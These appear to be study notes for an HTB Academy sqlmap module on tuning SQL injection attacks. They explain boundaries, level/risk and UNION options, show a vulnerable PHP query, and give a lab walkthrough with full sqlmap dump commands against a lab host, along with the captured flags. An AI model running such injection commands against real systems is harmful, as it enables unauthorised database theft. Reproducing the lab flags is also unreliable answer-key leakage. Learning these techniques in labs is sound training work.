# Section 6 — Attack Tuning

---

## Payload Anatomy

```
[boundary prefix] [VECTOR] [boundary suffix]
        ↓             ↓            ↓
       %'))    UNION SELECT...   -- -
```

- **Vector** — the SQL payload that does the work (UNION SELECT, AND 1=1, SLEEP, etc.)
- **Boundaries** — prefix/suffix that break out of the original query context and comment away the remainder

---

## Prefix / Suffix

```bash
sqlmap -u "TARGET/?q=test" --prefix="%'))" --suffix="-- -"
```

For the vulnerable code:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
```

The injected statement becomes:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

> Use `--prefix`/`--suffix` only when the query has unusual wrappers that sqlmap's default boundary set doesn't crack.

---

## Level / Risk

| Flag | Default | Max | What it tunes |
|------|---------|-----|---------------|
| `--level` | 1 | 5 | Number of boundaries + payloads tested (lower expectancy = higher level) |
| `--risk` | 1 | 3 | Adds risky vectors (OR payloads, stacked queries — can modify DB content) |

**Payload count:**
- Default (`--level=1 --risk=1`) → ~72 payloads per parameter
- Max (`--level=5 --risk=3`) → ~7,865 payloads

```bash
# Force testing OR payloads (needed for login pages — disabled by default at risk=1)
sqlmap -u "TARGET" --risk=3

# Test cookies, User-Agent, Referer headers (not tested at level 1)
sqlmap -u "TARGET" --cookie="..." --level=2
```

> **Why OR payloads are gated**: They can match all rows. In an `UPDATE` or `DELETE` query (rare but possible), an OR payload can corrupt or wipe the table. Raise `--risk` deliberately when you know the underlying query is `SELECT`.

---

## Advanced Detection Tuning

| Option | Use when |
|--------|----------|
| `--code=200` | TRUE vs FALSE responses differ only by HTTP status code |
| `--titles` | TRUE/FALSE differ only in HTML `<title>` content |
| `--string="success"` | TRUE responses contain a constant string; FALSE don't |
| `--text-only` | Strip HTML tags and compare visible text only (avoids dynamic `<script>`/`<meta>`) |
| `--technique=BEU` | Skip Stacked/Time-based; only test Boolean, Error, UNION |
| `--technique=U` | UNION only (fastest if you know it works) |

---

## UNION SQLi Tuning

| Option | Purpose |
|--------|---------|
| `--union-cols=N` | Skip column-count detection; force N columns |
| `--union-char='a'` | Replace NULL/random-int filler with custom value (when NULLs are filtered) |
| `--union-from=users` | Append `FROM <table>` to UNION (required for Oracle) |
| `--no-cast` | Disable type casting on retrieved data — fixes silent failures with JSON/complex bodies |

---

## Lab — Cases 5, 6, 7

**Target:** `154.57.164.72:30732`

### Case 5 — OR SQLi

OR payloads are disabled by default (risk of mass-matching). Raise risk to 3.

```bash
sqlmap -u "http://154.57.164.72:30732/case5.php?id=1" \
  --dbms=mysql --batch --risk=3 --technique=BEU \
  --dump -T flag5
```

**flag5:** `HTB{700_much_r15k_bu7_w0r7h_17}`

---

### Case 6 — Non-standard boundaries

The query wraps `col` in backtick + parenthesis: ``SELECT ... WHERE (`<col>`) ...``. Only the literal `id` returns rows because:
- `` `id` `` is a valid column reference, truthy for non-zero values
- `` `name` `` etc. are valid columns but cast to 0 in boolean context

Need `--prefix='`)' --suffix='-- -'` to break out of the backtick+paren wrapper. Default level doesn't include this boundary pair — raise to `--level=4` (or higher).

```bash
sqlmap -u "http://154.57.164.72:30732/case6.php?col=id" \
  -p col --dbms=mysql --batch \
  --prefix='`)' --suffix='-- -' \
  --technique=U --level=4 --no-cast \
  --dump -T flag6
```

The injected query becomes:
```sql
SELECT ... WHERE (`id`) UNION ALL SELECT NULL,NULL,NULL,NULL,<data>,NULL-- -`) ...
```

> `--no-cast` required for retrieval (same as Case 4) — without it, sqlmap falls back to partial UNION and fails to dump.

**flag6:** `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`

---

### Case 7 — UNION with adjustments

UNION-based but the default UNION column detection fails due to type-casting issues. Force `--no-cast` and specify column count.

```bash
sqlmap -u "http://154.57.164.72:30732/case7.php?id=1" \
  --dbms=mysql --batch --technique=U \
  --union-cols=5 --no-cast \
  --dump -T flag7
```

**flag7:** `HTB{un173_7h3_un173d}`

---

## Exam Notes

- Default sqlmap (`--level=1 --risk=1`) covers ~95% of injections — only raise when default fails
- OR injection on a login page → bump `--risk=3` or it'll never test the right payloads
- "Non-standard boundaries" means the query has unusual wrappers (`)`, `]`, `` ` ``, custom delimiters) — use `--prefix`/`--suffix` to break out
- For UNION-only attacks: combine `--technique=U` + `--union-cols=N` + `--no-cast` for the cleanest, fastest run
- When stuck: check the HTB forum for the exact boundary — guessing wastes more time than reading the answer

## Sources

- [HTB Academy — SQLMAP ESSENTIALS — Case6 — Non-standard boundaries (HTB Forum)](https://forum.hackthebox.com/t/htb-academy-sqlmap-essentials-case6-non-standard-boundaries/243441)
